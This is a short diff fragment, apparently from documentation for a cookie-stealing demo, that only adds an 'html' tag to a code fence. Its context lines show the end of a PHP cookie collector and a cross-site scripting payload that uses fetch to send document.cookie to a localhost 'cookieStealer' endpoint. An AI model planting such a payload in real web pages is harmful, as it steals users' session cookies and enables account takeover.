@@ -182,7 +182,7 @@ fclose($file);
 echo json_encode(["status" => 200]);
 ?>
 ```
-```
+```html
 <script>
 fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
 </script>
